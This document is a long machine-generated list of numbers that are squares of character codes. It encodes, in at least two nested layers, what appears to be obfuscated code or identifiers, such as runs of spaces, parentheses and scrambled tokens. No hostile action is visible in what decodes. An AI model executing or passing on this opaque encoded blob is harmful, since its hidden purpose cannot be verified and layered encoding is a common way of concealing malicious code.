,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2401,2401,2500,2601,2916,1936,2601,2304,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2401,2704,2704,2304,2304,1936,2601,2304,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,3025,2601,3249,2916,1936,2916,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2304,2500,2704,1936,2916,3136,3136,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2916,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,2704,2704,3136,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2809,2916,2500,2809,1936,2809,3249,2500,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,3025,3025,2704,2704,1936,2704,2704,3136,3249,1936,3249,2304,2500,2809,1936,2704,2704,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2916,2304,2704,1936,2401,2401,2916,2916,2704,1936,2704,3249,2304,2304,1936,3136,2401,2304,2304,1936,3249,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2500,2401,2304,2304,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,3025,2809,2916,3249,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,2500,2401,2401,2916,1936,2500,2401,2401,2916,1936,2500,2401,2401,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,2704,2704,3136,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2809,2916,2500,2809,1936,2809,3249,2500,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2500,2601,2916,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2304,2500,2809,1936,3025,2304,2809,2916,1936,2809,2601,2500,3249,1936,2401,2704,2704,2304,2304,1936,2401,2704,2401,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2809,2601,2500,3249,1936,3025,2304,2809,2916,1936,2809,2601,2500,3249,1936,2916,3136,3136,3249,1936,2401,2704,2401,2916,2401,1936,2916,3136,3136,3249,1936,2916,3136,3136,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2304,2500,2809,1936,2601,2304,2500,2809,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,2401,2401,2304,2500,2809,1936,2916,3136,3136,3249,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2809,2601,2500,3249,1936,3025,2304,2809,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2704,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2304,2500,2809,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2916,3136,3136,3249,1936,2601,2304,2500,2809,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2601,2304,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2704,2704,2304,2304,1936,2401,2401,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,2401,2401,2809,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2401,3136,3136,2401,1936,2916,3136,3136,3249,1936,3249,3136,2304,2401,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2401,2304,2500,2809,1936,2401,2500,2601,2500,2401,1936,2401,2401,2500,2601,2916,1936,3025,3249,2500,2401,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2704,2704,2304,2304,1936,3249,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,3249,3136,2304,2401,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,3025,2809,2916,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2916,2704,2304